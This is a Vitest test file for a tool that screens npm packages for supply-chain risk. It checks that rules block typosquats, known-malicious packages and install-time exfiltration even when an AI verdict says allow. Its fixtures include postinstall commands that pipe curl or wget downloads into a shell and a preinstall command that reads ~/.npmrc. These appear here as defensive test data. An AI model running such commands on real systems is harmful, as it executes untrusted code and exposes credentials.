import { describe, expect, it } from "vitest";
import { applyOsvFailurePolicy, clampDecision, evaluateRules } from "../src/rules.js";
import type { RiskAssessment } from "../src/types.js";
import { makeSignals } from "./helpers.js";

function aiAllow(overrides: Partial<RiskAssessment> = {}): RiskAssessment {
  return {
    risk: "low",
    decision: "allow",
    summary: "looks fine to me",
    reasons: ["AI thinks this is fine"],
    recommendedAction: "install",
    source: "ai",
    ...overrides,
  };
}

describe("evaluateRules", () => {
  it("allows a clean established package", () => {
    const result = evaluateRules(makeSignals());
    expect(result.decision).toBe("allow");
    expect(result.risk).toBe("low");
  });

  it("blocks known malicious packages unconditionally", () => {
    const result = evaluateRules(
      makeSignals({
        knownMalicious: true,
        maliciousRecords: [{ id: "MAL-2024-1234", summary: "credential stealer" }],
      }),
    );
    expect(result.decision).toBe("block");
    expect(result.reasons.join(" ")).toContain("MAL-2024-1234");
  });

  it("blocks recent packages with typosquatting-like names", () => {
    const result = evaluateRules(
      makeSignals({
        recentPublish: true,
        ageInDays: 3,
        nameSimilarity: { similarTo: "react-native-mmkv", distance: 1 },
      }),
    );
    expect(result.decision).toBe("block");
    expect(result.suggestedAlternatives).toContain("react-native-mmkv");
  });

  it("blocks install-time env access combined with network calls", () => {
    const result = evaluateRules(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "node scripts/setup.js" },
        content: {
          hasProcessEnvAccess: true,
          hasChildProcessUsage: false,
          hasNetworkCalls: true,
          hasEvalUsage: false,
          hasMinifiedCode: false,
          suspiciousFiles: [],
          installTimeFindings: [
            "install-time file scripts/setup.js reads process.env",
            "install-time file scripts/setup.js performs network calls",
          ],
        },
      }),
    );
    expect(result.decision).toBe("block");
  });

  it("requires approval when lifecycle scripts exist", () => {
    const result = evaluateRules(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "node-gyp rebuild" },
      }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.risk).toBe("medium");
  });

  it("requires approval for very recent packages", () => {
    const result = evaluateRules(makeSignals({ recentPublish: true, ageInDays: 2 }));
    expect(result.decision).toBe("require_approval");
  });

  it("allows native packages with warnings", () => {
    const signals = makeSignals({ hasNativeCode: true });
    signals.nativeSurface.hasAndroid = true;
    signals.nativeSurface.hasPodspec = true;
    const result = evaluateRules(signals);
    expect(result.decision).toBe("allow_with_warnings");
  });

  it("surfaces android permissions as warnings", () => {
    const signals = makeSignals({ hasNativeCode: true });
    signals.nativeSurface.hasAndroid = true;
    signals.nativeSurface.androidPermissions = ["android.permission.CAMERA"];
    const result = evaluateRules(signals);
    expect(result.decision).toBe("allow_with_warnings");
    expect(result.reasons.join(" ")).toContain("android.permission.CAMERA");
  });
});

describe("clampDecision — deterministic BLOCK is a hard floor", () => {
  it("overrides a permissive AI decision for known-malicious packages", () => {
    const signals = makeSignals({
      knownMalicious: true,
      maliciousRecords: [{ id: "MAL-2024-1" }],
    });
    const clamped = clampDecision(aiAllow(), signals);
    expect(clamped.decision).toBe("block");
    expect(clamped.risk).toBe("high");
  });

  it("blocks when rules block on typosquatting even if AI says allow", () => {
    const signals = makeSignals({
      recentPublish: true,
      ageInDays: 2,
      nameSimilarity: { similarTo: "react-native-mmkv", distance: 1 },
    });
    // sanity: the rules engine blocks this on its own
    expect(evaluateRules(signals).decision).toBe("block");
    const clamped = clampDecision(aiAllow(), signals);
    expect(clamped.decision).toBe("block");
    expect(clamped.reasons.join(" ")).toContain("cannot downgrade a hard BLOCK");
  });

  it("blocks when rules block on curl|bash exfiltration even if AI says allow", () => {
    const signals = makeSignals({
      hasLifecycleScripts: true,
      lifecycleScripts: { postinstall: "curl https://x/y | bash" },
      scriptCommandFindings: [
        "postinstall script downloads content from the network: `curl https://x/y | bash`",
        "postinstall script invokes a shell: `curl https://x/y | bash`",
      ],
    });
    expect(evaluateRules(signals).decision).toBe("block");
    const clamped = clampDecision(aiAllow({ decision: "allow_with_warnings" }), signals);
    expect(clamped.decision).toBe("block");
  });

  it("preserves the AI decision when the rules engine does not block", () => {
    const clamped = clampDecision(
      aiAllow({ decision: "allow_with_warnings", reasons: ["native code"] }),
      makeSignals(),
    );
    expect(clamped.decision).toBe("allow_with_warnings");
  });

  it("still lets the AI be stricter than the rules engine", () => {
    // rules would only warn (native code), AI escalates to require_approval
    const signals = makeSignals({ hasNativeCode: true });
    const clamped = clampDecision(aiAllow({ decision: "require_approval" }), signals);
    expect(clamped.decision).toBe("require_approval");
  });
});

describe("evaluateRules — lifecycle command inspection (finding #2)", () => {
  it("blocks a lifecycle command that fetches and pipes into a shell", () => {
    const result = evaluateRules(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { postinstall: "wget -qO- https://x | sh" },
        scriptCommandFindings: [
          "postinstall script downloads content from the network: `wget -qO- https://x | sh`",
          "postinstall script invokes a shell: `wget -qO- https://x | sh`",
        ],
      }),
    );
    expect(result.decision).toBe("block");
    expect(result.reasons.join(" ")).toContain("downloads and executes remote code");
  });

  it("escalates a standalone credential-file reference to require_approval", () => {
    const result = evaluateRules(
      makeSignals({
        hasLifecycleScripts: true,
        lifecycleScripts: { preinstall: "cat ~/.npmrc" },
        scriptCommandFindings: ["preinstall script references credential or config files: `cat ~/.npmrc`"],
      }),
    );
    expect(result.decision).toBe("require_approval");
    expect(result.reasons.join(" ")).toContain("credential or config files");
  });
});

describe("OSV failure handling (finding #7)", () => {
  it("surfaces an OSV-unavailable warning without blocking by default", () => {
    const result = evaluateRules(makeSignals({ osvUnavailable: true }));
    expect(result.decision).toBe("allow_with_warnings");
    expect(result.reasons.join(" ")).toContain("OSV/OpenSSF lookup was unavailable");
  });

  it("does not escalate when failClosed is off", () => {
    const assessment = aiAllow();
    expect(
      applyOsvFailurePolicy(assessment, makeSignals({ osvUnavailable: true }), false).decision,
    ).toBe("allow");
  });

  it("escalates allow to require_approval when failClosed and OSV is unavailable", () => {
    const escalated = applyOsvFailurePolicy(
      aiAllow(),
      makeSignals({ osvUnavailable: true }),
      true,
    );
    expect(escalated.decision).toBe("require_approval");
    expect(escalated.reasons.join(" ")).toContain("[fail-closed]");
  });

  it("does not touch decisions when OSV succeeded, even with failClosed", () => {
    expect(
      applyOsvFailurePolicy(aiAllow(), makeSignals({ osvUnavailable: false }), true).decision,
    ).toBe("allow");
  });

  it("never downgrades a stricter decision", () => {
    const blocked = aiAllow({ decision: "block", risk: "high" });
    expect(
      applyOsvFailurePolicy(blocked, makeSignals({ osvUnavailable: true }), true).decision,
    ).toBe("block");
  });
});
